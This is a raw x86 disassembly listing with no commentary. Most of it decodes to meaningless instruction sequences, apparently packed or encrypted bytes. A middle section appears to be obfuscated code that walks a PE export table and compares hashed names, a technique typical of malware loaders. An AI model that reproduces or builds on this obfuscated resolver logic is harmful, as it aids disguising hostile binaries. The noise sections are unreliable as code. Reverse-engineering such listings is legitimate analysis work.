  404715:	fimul  WORD PTR [eax+0x4d583838]
  40471b:	push   cs
  40471c:	mov    esi,0x4c9d0a77
  404721:	ret    0x37ed
  404724:	enter  0xc9c5,0xf6
  404728:	mov    bl,BYTE PTR [esi+0x46]
  40472b:	lahf   
  40472c:	push   cs
  40472d:	cli    
  40472e:	fwait
  40472f:	jno    0x404792
  404731:	(bad)  
  404732:	sbb    DWORD PTR [edx+0x2f],ebx
  404735:	sbb    esp,DWORD PTR es:[esp+edi*1]
  404739:	enter  0xfb43,0x6c
  40473d:	cs cmc 
  40473f:	sub    cl,BYTE PTR [edx+0x31]
  404742:	mov    ebp,0xd82d2924
  404747:	pop    edx
  404748:	bound  ebx,QWORD PTR [edi]
  40474a:	mov    esp,0xf0a2f21a
  40474f:	int3   
  404750:	push   eax
  404751:	fucomip st,st(6)
  404753:	jg     0x40478d
  404755:	mov    ch,0x51
  404757:	jb     0x404712
  404759:	mul    DWORD PTR [ebx-0x75]
  40475c:	pminsw mm0,QWORD PTR [eax]
  40475f:	scas   al,BYTE PTR es:[edi]
  404760:	imul   edx,DWORD PTR [ebx],0x6b
  404763:	push   cs
  404764:	adc    DWORD PTR [esi+0x3c],esi
  404767:	jmp    0x2f07:0x95d5ceb2
  40476e:	push   ebp
  40476f:	xor    al,0x76
  404771:	neg    DWORD PTR [ecx+0x6eb66c0]
  404777:	add    DWORD PTR ds:0x51587bf2,0x4c04719e
  404781:	fist   WORD PTR [eax+0x23]
  404784:	test   BYTE PTR [edx],0x22
  404787:	jecxz  0x404795
  404789:	jmp    0xc914687a
  40478e:	(bad)  
  40478f:	sub    BYTE PTR [ecx-0x2c],ah
  404792:	mov    ds:0x3fa04748,al
  404797:	jmp    0x55f9:0x45481ee9
  40479e:	test   al,0xfa
  4047a0:	retf   
  4047a1:	sbb    BYTE PTR [edi+esi*8],ch
  4047a4:	dec    esi
  4047a5:	mov    ah,BYTE PTR [ebx+esi*8-0x68]
  4047a9:	imul   DWORD PTR [eax-0x4d09bdcc]
  4047af:	push   cs
  4047b0:	or     BYTE PTR [edi],bl
  4047b2:	pop    ds
  4047b3:	ins    BYTE PTR es:[edi],dx
  4047b4:	adc    BYTE PTR [esi+esi*4-0x1f],dh
  4047b8:	es (bad) 
  4047ba:	hlt    
  4047bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047bc:	rol    DWORD PTR [ebx+0x737064c],1
  4047c2:	test   al,0x88
  4047c4:	xchg   esp,eax
  4047c5:	nop
  4047c6:	mov    eax,ds:0xaaad4473
  4047cb:	dec    esp
  4047cc:	in     al,0xee
  4047ce:	pushf  
  4047cf:	stos   DWORD PTR es:[edi],eax
  4047d0:	cs mov eax,0xac3920d8
  4047d6:	pop    esi
  4047d7:	xor    esp,edx
  4047d9:	add    al,BYTE PTR [ecx-0x45]
  4047dc:	aam    0xa
  4047de:	xchg   ecx,eax
  4047df:	cmc    
  4047e0:	pop    eax
  4047e1:	lahf   
  4047e2:	jmp    0x404827
  4047e4:	jns    0x4047ef
  4047e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047e7:	xchg   edi,eax
  4047e8:	mov    ebx,0x7c84818f
  4047ed:	cs mov esi,0x74eec30a
  4047f3:	rcl    DWORD PTR [eax-0x2f],0x77
  4047f7:	daa    
  4047f8:	sub    al,0x33
  4047fa:	call   0x27171a0c
  4047ff:	cmp    eax,0x2c4fcb90
  404804:	jp     0x404853
  404806:	or     al,0x5f
  404808:	fiadd  DWORD PTR [ecx-0x35]
  40480b:	(bad)  
  40480d:	mov    bl,0x68
  40480f:	mov    bh,0x1d
  404811:	out    dx,eax
  404812:	xor    ah,dl
  404814:	jns    0x404834
  404816:	nop
  404817:	(bad)  
  404818:	out    0x6d,al
  40481a:	aaa    
  40481b:	inc    esp
  40481c:	xor    al,0xf9
  40481e:	loopne 0x4047cd
  404820:	mov    ds:0x804ec02b,al
  404825:	popa   
  404826:	loop   0x4047be
  404828:	push   eax
  404829:	or     eax,0xe18519cd
  40482e:	push   ebx
  40482f:	adc    BYTE PTR [ecx+eax*1+0xf],dl
  404833:	jecxz  0x4047ff
  404835:	pop    ss
  404836:	dec    edx
  404837:	jmp    0x4ab7:0x2e2adb29
  40483e:	pop    edi
  40483f:	(bad)  
  404840:	inc    edi
  404841:	xchg   esi,eax
  404842:	inc    edx
  404843:	push   cs
  404844:	lea    ebp,[esi]
  404846:	cmp    edx,ecx
  404848:	adc    bh,dl
  40484a:	cmp    dl,dh
  40484c:	cli    
  40484d:	loop   0x4048a3
  40484f:	push   ebp
  404850:	mov    ah,0xd5
  404852:	inc    edi
  404853:	mov    ss,WORD PTR [edi+ecx*1-0x4a87d262]
  40485a:	in     al,0xf6
  40485c:	xlat   BYTE PTR ds:[ebx]
  40485d:	outs   dx,DWORD PTR ds:[esi]
  40485e:	in     eax,dx
  40485f:	push   ebx
  404860:	into   
  404861:	xchg   esp,eax
  404862:	jle    0x40489c
  404864:	test   eax,0xff373b53
  404869:	mov    edi,0x6220c26e
  40486e:	mov    edi,0xc8d66229
  404873:	mov    ecx,0x59927859
  404878:	mov    ebx,0xbfa73f8e
  40487d:	mov    esi,0x57d6c70
  404882:	push   es
  404883:	mov    eax,0xa5662d98
  404888:	das    
  404889:	jne    0x4048a0
  40488b:	pop    ebx
  40488c:	stos   DWORD PTR es:[edi],eax
  40488d:	mov    esp,0x67867f69
  404892:	out    0x7f,al
  404894:	dec    edi
  404895:	neg    BYTE PTR [ecx-0x13b3d9b3]
  40489b:	shl    ebx,cl
  40489d:	lods   al,BYTE PTR ds:[esi]
  40489e:	jmp    0x66f7:0x78c66f11
  4048a5:	mov    dl,0xae
  4048a7:	test   BYTE PTR [ecx-0x3a],dh
  4048aa:	div    BYTE PTR ds:0x4647f827
  4048b0:	rcl    DWORD PTR [edi],1
  4048b2:	jp     0x404877
  4048b4:	loope  0x404927
  4048b6:	mov    al,0x11
  4048b8:	mov    ds:0xf124b479,eax
  4048bd:	push   DWORD PTR [ecx-0x3aa54118]
  4048c3:	pop    ecx
  4048c4:	stos   BYTE PTR es:[edi],al
  4048c5:	imul   esp,DWORD PTR [edx+0x53754c73],0xe8ae7fed
  4048cf:	lods   eax,DWORD PTR ds:[esi]
  4048d0:	js     0x40485d
  4048d2:	cdq    
  4048d3:	pop    ss
  4048d4:	dec    edi
  4048d5:	xchg   ebx,eax
  4048d6:	test   DWORD PTR [edx],esi
  4048d8:	mov    bh,0xc6
  4048da:	in     eax,dx
  4048db:	jge    0x40488a
  4048dd:	fwait
  4048de:	jg     0x40490e
  4048e0:	retf   
  4048e1:	test   DWORD PTR [eax],ecx
  4048e3:	xor    BYTE PTR [edx+edi*4],al
  4048e6:	mov    ds:0xf5ba23ff,eax
  4048eb:	mov    ds:0x6c0d0da4,al
  4048f0:	push   edi
  4048f1:	std    
  4048f2:	cdq    
  4048f3:	and    ebx,edx
  4048f5:	cmp    eax,0xa4b47bb7
  4048fa:	dec    edx
  4048fb:	xlat   BYTE PTR ds:[ebx]
  4048fc:	int    0xc9
  4048fe:	dec    edi
  4048ff:	dec    edi
  404900:	inc    esp
  404901:	xchg   BYTE PTR [eax+0x2df2d1d9],ch
  404907:	and    edx,DWORD PTR [edi-0x248697ac]
  40490d:	lds    edi,FWORD PTR [esi+0x5c9f19]
  404913:	fadd   DWORD PTR [edx+0x56]
  404916:	mov    bl,0xec
  404918:	mov    al,0x29
  40491a:	inc    ebx
  40491b:	and    ch,bl
  40491d:	xor    eax,0x864dc9e4
  404922:	loop   0x404975
  404924:	nop
  404925:	pcmpeqb mm3,QWORD PTR [edx-0x52b4921a]
  40492c:	ss pop eax
  40492e:	and    DWORD PTR [eax-0x60],ecx
  404931:	xor    esi,DWORD PTR [ebp+0x157a5c68]
  404937:	leave  
  404938:	sahf   
  404939:	gs in  eax,0x10
  40493c:	and    BYTE PTR [ebp+0x70aa34f],dl
  404942:	rcl    DWORD PTR [edi+0x24e2f9e6],cl
  404948:	cmp    BYTE PTR ds:0xbf5ac756,cl
  40494e:	jbe    0x404957
  404950:	stos   BYTE PTR es:[edi],al
  404951:	cmp    al,0xf0
  404953:	out    0x1,eax
  404955:	push   esi
  404956:	cmp    eax,0xadd16363
  40495b:	mul    BYTE PTR [esi-0x32cc7412]
  404961:	or     eax,0x2325cd8d
  404966:	idiv   ebp
  404968:	mov    edx,0x25819dad
  40496d:	repnz pop edi
  40496f:	rcl    edi,1
  404971:	push   cs
  404972:	xchg   edi,eax
  404973:	int    0x8f
  404975:	inc    ecx
  404976:	mov    ss,WORD PTR ds:0x8a047025
  40497c:	inc    ebp
  40497d:	retf   
  40497e:	jp     0x404945
  404980:	std    
  404981:	les    ebp,FWORD PTR ds:0xe1debe09
  404987:	jnp    0x404944
  404989:	fiadd  WORD PTR [edi]
  40498b:	loope  0x40497d
  40498d:	cmp    al,BYTE PTR [ebx+0x18]
  404990:	jp     0x404946
  404992:	mov    edi,0xc63016d
  404997:	mov    edi,0x411c8bc3
  40499c:	xchg   edx,eax
  40499d:	push   ecx
  40499e:	jmp    0xe1c15c51
  4049a3:	inc    edx
  4049a4:	jns    0x404959
  4049a6:	pop    esi
  4049a7:	bound  eax,QWORD PTR [edi]
  4049a9:	call   0xffec:0xfee5d0bd
  4049b0:	push   ds
  4049b1:	adc    al,BYTE PTR [ebp-0x74]
  4049b4:	cmp    al,0xf2
  4049b6:	pop    eax
  4049b7:	jg     0x404a2e
  4049b9:	in     al,0xbd
  4049bb:	inc    ebx
  4049bc:	sbb    al,0xb1
  4049be:	or     al,0x27
  4049c0:	stos   DWORD PTR es:[edi],eax
  4049c1:	inc    ebx
  4049c3:	dec    ebp
  4049c4:	ret    0xdd21
  4049c7:	sbb    eax,0x62aa58d0
  4049cc:	test   edx,edi
  4049ce:	lods   eax,DWORD PTR ds:[esi]
  4049cf:	mov    al,0x4a
  4049d1:	mov    BYTE PTR [edx+0x19],dh
  4049d4:	sub    esi,DWORD PTR [edx-0x284fcdaa]
  4049da:	xchg   edi,eax
  4049db:	test   BYTE PTR [edx+0x67],dh
  4049de:	xchg   ah,bh
  4049e0:	jl     0x4049ef
  4049e2:	push   ax
  4049e4:	in     al,dx
  4049e5:	int3   
  4049e6:	pop    esp
  4049e7:	ins    DWORD PTR es:[edi],dx
  4049e8:	inc    ecx
  4049e9:	or     cl,dh
  4049eb:	ror    DWORD PTR ds:0x53c097ca,0x1f
  4049f2:	mov    ecx,edx
  4049f4:	add    al,BYTE PTR [edi]
  4049f6:	bound  esi,QWORD PTR [eax+eax*8-0x25]
  4049fa:	sbb    esi,edi
  4049fc:	xchg   edx,eax
  4049fd:	mov    al,0xf6
  4049ff:	mov    eax,ds:0x2e454a49
  404a04:	cmp    eax,0x7be4f885
  404a09:	ins    DWORD PTR es:[edi],dx
  404a0a:	or     BYTE PTR [edi-0x47ac4ae3],ch
  404a10:	sbb    dh,BYTE PTR [ecx-0x5e1c909f]
  404a16:	popa   
  404a17:	fwait
  404a18:	ins    DWORD PTR es:[edi],dx
  404a19:	call   0x76a0:0xcd7bf1b6
  404a20:	xor    eax,0x48b64f95
  404a25:	mov    ebx,DWORD PTR [ebx+edx*4-0x2e5d42d]
  404a2c:	push   cs
  404a2d:	inc    eax
  404a2e:	mov    ebx,0x2c821dcb
  404a33:	aam    0x38
  404a35:	xchg   dh,ah
  404a37:	inc    edx
  404a38:	push   edi
  404a39:	lock test eax,0xbfa8a29d
  404a3f:	jo     0x4049c3
  404a41:	ret    0x53ea
  404a44:	fst    QWORD PTR [edi+0x7596f99b]
  404a4a:	retf   0x6015
  404a4d:	call   0xd3b46a6a
  404a52:	or     DWORD PTR ds:0xcb2a1d7,ecx
  404a58:	sub    DWORD PTR [ecx],esi
  404a5a:	adc    ebp,edi
  404a5c:	out    0x31,eax
  404a5e:	cld    
  404a5f:	div    BYTE PTR [ecx+0x57c8a8ea]
  404a65:	dec    edi
  404a66:	data16 out dx,al
  404a68:	mov    dh,0xf
  404a6a:	arpl   WORD PTR [ebx],cx
  404a6c:	and    BYTE PTR [edi+0x4219584c],ch
  404a72:	ins    DWORD PTR es:[edi],dx
  404a73:	loop   0x404ab3
  404a75:	jle    0x404ab8
  404a77:	push   ecx
  404a78:	test   cl,0x6b
  404a7b:	xor    DWORD PTR ss:[eax],edi
  404a7e:	sbb    BYTE PTR [ecx-0x585b292f],al
  404a84:	cmp    DWORD PTR [edx],edi
  404a86:	pop    esi
  404a87:	xor    BYTE PTR [edx+ebx*8-0x20],al
  404a8b:	dec    edx
  404a8c:	mov    al,0x61
  404a8e:	sub    dl,BYTE PTR [edi-0x58]
  404a91:	push   es
  404a92:	retf   0x654c
  404a95:	or     bh,0xb1
  404a98:	out    0x5b,al
  404a9a:	push   eax
  404a9b:	ja     0x404a84
  404a9d:	pop    ecx
  404a9e:	jg     0x404a87
  404aa0:	iret   
  404aa1:	loop   0x404aa1
  404aa3:	or     al,0xce
  404aa5:	mov    ds:0x542ec4b9,al
  404aaa:	mov    dh,al
  404aac:	outs   dx,DWORD PTR ds:[esi]
  404aad:	daa    
  404aae:	out    0x17,eax
  404ab0:	pop    ebp
  404ab1:	jge    0x404a88
  404ab3:	test   eax,0x9ea2c5c2
  404ab8:	std    
  404ab9:	fiadd  WORD PTR [ebx*2+0x7dd202fe]
  404ac0:	jo     0x4343a1e5
  404ac6:	ds mov ebx,0x1ef32f80
  404acc:	pusha  
  404acd:	(bad)  
  404acf:	add    al,0x75
  404ad1:	mov    eax,ds:0x8f3112cb
  404ad6:	aas    
  404ad7:	or     al,bh
  404ad9:	xchg   BYTE PTR [edi+eax*4],bh
  404adc:	mov    ch,0x27
  404ade:	jecxz  0x404b3e
  404ae0:	or     ch,BYTE PTR [edx+ebx*2-0x7cb3238b]
  404ae7:	mov    ah,0x48
  404ae9:	and    esi,esp
  404aeb:	inc    ebx
  404aec:	and    BYTE PTR [edx],0x8
  404aef:	sbb    al,0x83
  404af1:	js     0x404a79
  404af3:	push   cs
  404af4:	and    BYTE PTR [esi+ebp*4-0x3df2bfcf],al
  404afb:	jae    0x404adc
  404afd:	mov    ds:0xbd046fd8,eax
  404b02:	imul   edx,DWORD PTR [eax+ebx*8+0x7415f8ba],0xffffffdf
  404b0a:	push   esp
  404b0b:	hlt    
  404b0c:	rcl    eax,0x32
  404b0f:	sahf   
  404b10:	sbb    al,0x5d
  404b12:	and    BYTE PTR [ebx+ebx*1+0x20],al
  404b16:	jmp    0x831:0xf0a6684b
  404b1d:	sbb    DWORD PTR [esp+esi*2],ecx
  404b20:	sub    BYTE PTR [edx+0x40],ah
  404b23:	gs mov esp,0x36ea8077
  404b29:	cmc    
  404b2a:	std    
  404b2b:	fsub   QWORD PTR [eax-0x55]
  404b2e:	pop    esi
  404b2f:	out    dx,al
  404b30:	add    al,0x3e
  404b32:	test   al,0xe3
  404b34:	leave  
  404b35:	jp     0x404adb
  404b37:	je     0x404aed
  404b39:	mov    ds:0x30adc22c,al
  404b3e:	inc    edi
  404b3f:	daa    
  404b40:	cmc    
  404b41:	nop
  404b42:	cmp    ecx,esp
  404b44:	vpsllq xmm4,xmm3,XMMWORD PTR [esi-0x61]
  404b49:	mov    WORD PTR [ebx-0x6b48d3d6],?
  404b4f:	or     ebp,ebx
  404b51:	lahf   
  404b52:	fadd   QWORD PTR [edx+ebx*4]
  404b55:	hlt    
  404b56:	ss mov ah,0x16
  404b59:	in     al,dx
  404b5a:	sub    ah,ah
  404b5c:	fldcw  WORD PTR [eax-0x14bfea9c]
  404b62:	retf   
  404b63:	sbb    eax,0xf9810c81
  404b68:	test   DWORD PTR ds:0x9aa6e81d,esp
  404b6e:	pop    edx
  404b6f:	xlat   BYTE PTR ds:[ebx]
  404b70:	outs   dx,BYTE PTR ds:[esi]
  404b71:	mov    ebx,?
  404b73:	cmp    eax,0xcf0e905e
  404b78:	mov    cs,edx
  404b7a:	or     eax,0x3f3efb93
  404b7f:	mov    BYTE PTR [edi],0x46
  404b82:	sbb    bh,0xd2
  404b85:	adc    al,0x34
  404b87:	and    dh,bl
  404b89:	xchg   ebp,eax
  404b8a:	shl    BYTE PTR [edi],0x8c
  404b8d:	xor    ecx,esi
  404b8f:	inc    ecx
  404b90:	lods   eax,DWORD PTR ds:[esi]
  404b91:	adc    DWORD PTR [ebp-0x54482514],ebp
  404b97:	and    DWORD PTR [esi-0x47571f19],esp
  404b9d:	cld    
  404b9e:	jnp    0x404b41
  404ba0:	jo     0x404b85
  404ba2:	adc    eax,0x6e0505bc
  404ba7:	jmp    0x7f1f:0xb52d3524
  404bae:	pop    edx
  404baf:	das    
  404bb0:	adc    ch,BYTE PTR [edx-0x7c]
  404bb3:	pushf  
  404bb4:	test   BYTE PTR [ebx+0x29],ch
  404bb7:	push   edi
  404bb8:	jnp    0x404bca
  404bba:	adc    eax,0xca96e5eb
  404bbf:	ret    0x6bbe
  404bc2:	lea    eax,[edi+edx*2-0x19]
  404bc6:	out    dx,al
  404bc7:	mov    al,ds:0x682df6ab
  404bcc:	aas    
  404bcd:	aad    0x10
  404bcf:	adc    ch,BYTE PTR [ebx+edx*8-0x167e2f0]
  404bd6:	(bad)  
  404bd8:	and    al,0x32
  404bda:	push   edi
  404bdb:	ins    BYTE PTR es:[edi],dx
  404bdc:	push   eax
  404bdd:	xor    edi,DWORD PTR [esi+0x47]
  404be0:	sbb    al,0xa9
  404be2:	add    al,0x23
  404be4:	push   ecx
  404be5:	jp     0x404b95
  404be7:	inc    edx
  404be8:	pop    ebp
  404be9:	mov    ds:0x39f1a99e,al
  404bee:	cwde   
  404bef:	std    
  404bf0:	les    ebp,FWORD PTR [ebx]
  404bf2:	xchg   edx,eax
  404bf3:	xchg   cl,cl
  404bf5:	addr16 pushf 
  404bf7:	(bad)  
  404bf8:	stc    
  404bf9:	popa   
  404bfa:	xor    ebp,DWORD PTR [eax+0x26]
  404bfd:	dec    eax
  404bfe:	in     eax,dx
  404bff:	sub    eax,0x38258f0
  404c04:	pop    es
  404c05:	sbb    DWORD PTR [esp+eiz*4+0x4dda60b8],0xece26872
  404c10:	retf   
  404c11:	lock inc edi
  404c13:	call   0x3d76:0x51a378df
  404c1a:	(bad)  
  404c1b:	fisttp QWORD PTR [ebx+eiz*4]
  404c1e:	mov    ebx,0xfcf18149
  404c23:	xor    esp,edi
  404c25:	xor    esp,DWORD PTR [ecx]
  404c27:	xor    BYTE PTR [ebp+eiz*8+0x63],0xa5
  404c2c:	fist   WORD PTR [edi-0x1ce9d7e3]
  404c32:	lea    ebx,[ecx-0x4ced6d3c]
  404c38:	pushf  
  404c39:	pop    ebx
  404c3a:	fisubr DWORD PTR [esi-0x3cad4411]
  404c40:	scas   al,BYTE PTR es:[edi]
  404c41:	fnstsw WORD PTR [eax+0x30]
  404c44:	push   0x24
  404c46:	mov    esi,0xb639ad8d
  404c4b:	and    BYTE PTR [esi],bh
  404c4d:	cmp    DWORD PTR [esi-0xe],eax
  404c50:	mov    edi,0xff4bd53f
  404c55:	mov    esp,0x8bfc458b
  404c5a:	dec    ebp
  404c5b:	call   0xc7440f93
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	xor    eax,0xa8c9fbd
  404e9b:	pop    edi
  404e9c:	jp     0x404f18
  404e9e:	or     bl,BYTE PTR [edi+0x7a]
  404ea1:	jp     0x404ec8
  404ea3:	ret    0x456a
  404ea6:	add    ch,BYTE PTR [ebp-0x580d3c2]
  404eac:	(bad)  
  404ead:	sbb    eax,DWORD PTR [edx+edi*4-0x21]
  404eb1:	iret   
  404eb2:	push   0xfffffff6
  404eb4:	retf   0x8696
  404eb7:	mov    bl,0xa0
  404eb9:	inc    ebp
  404eba:	aas    
  404ebb:	leave  
  404ebc:	and    al,BYTE PTR [ebx-0x2f]
  404ebf:	mov    DWORD PTR [eax+0x40abdae7],edi
  404ec5:	les    esi,FWORD PTR [edx]
  404ec7:	mov    BYTE PTR [ecx+0x174a60f5],dh
  404ecd:	int    0x94
  404ecf:	or     al,0x74
  404ed1:	push   ebx
  404ed2:	int3   
  404ed3:	cmp    al,0xe3
  404ed5:	punpckhdq mm4,QWORD PTR [ebp-0x43]
  404ed9:	mov    ecx,0x6580951c
  404ede:	push   0xffffffec
  404ee0:	les    esp,FWORD PTR [edi+0xaeb2357]
  404ee6:	mov    ecx,0x49a159b3
  404eeb:	fst    QWORD PTR [esp+0x3f]
  404eef:	int3   
  404ef0:	icebp  
  404ef1:	mov    eax,0x1408d8e8
  404ef6:	in     al,dx
  404ef7:	or     ah,0xed
  404efa:	aas    
  404efb:	mov    DWORD PTR [esi+0x13],ecx
  404efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eff:	jge    0x404ea3
  404f01:	mov    gs,ebx
  404f03:	push   ds
  404f04:	test   DWORD PTR [ebp-0x1e],0xa5e4952f
  404f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f0c:	aad    0x7a
  404f0e:	or     al,0xd1
  404f10:	cmc    
  404f11:	repnz fisub WORD PTR [edx]
  404f14:	call   FWORD PTR [ecx*8-0x1743a5fd]
  404f1b:	popf   
  404f1c:	jg     0x54b41e6b
  404f22:	cmp    al,BYTE PTR [edi]
  404f24:	push   cs
  404f25:	sub    ch,BYTE PTR [eax]
  404f27:	xchg   ebx,eax
  404f28:	fcom   QWORD PTR [esi+esi*8-0x92b545e]
  404f2f:	mov    eax,ds:0x174024c0
  404f34:	int3   
  404f35:	push   eax
  404f36:	sub    DWORD PTR fs:[ecx],ebx
  404f39:	jmp    0x404f36
  404f3b:	(bad)  
  404f3c:	sbb    cl,ch
  404f3e:	dec    esi
  404f3f:	xor    al,0xe0
  404f41:	out    0xb0,al
  404f43:	icebp  
  404f44:	mov    bh,0x90
  404f46:	aas    
  404f47:	add    BYTE PTR cs:[eax+eax*4],dl
  404f4b:	xchg   DWORD PTR [ebx-0x5],esp
  404f4e:	and    BYTE PTR ss:0x3ae30098,ah
  404f55:	stc    
  404f56:	test   esi,0x9a6ac755
  404f5c:	jp     0x404f97
  404f5e:	ds jne 0x404f83
  404f61:	inc    edx
  404f62:	not    DWORD PTR [edi]
  404f64:	dec    ecx
  404f65:	aam    0x92
  404f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f68:	sub    esp,DWORD PTR [eax-0x52]
  404f6b:	sbb    BYTE PTR [esi+ebp*1],0x2d
  404f6f:	mov    bh,BYTE PTR [edi+ebp*2]
  404f72:	push   ebx
  404f73:	ins    BYTE PTR es:[di],dx
  404f75:	pop    ecx
  404f76:	std    
  404f77:	xor    al,0x56
  404f79:	jns    0x404f23
  404f7b:	jb     0x404f31
  404f7d:	es (bad) 
  404f7f:	fimul  DWORD PTR [ebx+0x2e]
  404f82:	and    al,0xa
  404f84:	jae    0x404f98
  404f86:	adc    eax,0x883d3d64
  404f8b:	lahf   
  404f8c:	push   ebx
  404f8d:	mov    dh,0x5a
  404f8f:	rcr    bh,cl
  404f91:	in     al,0xe9
  404f93:	mov    ebp,0x2c287821
  404f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
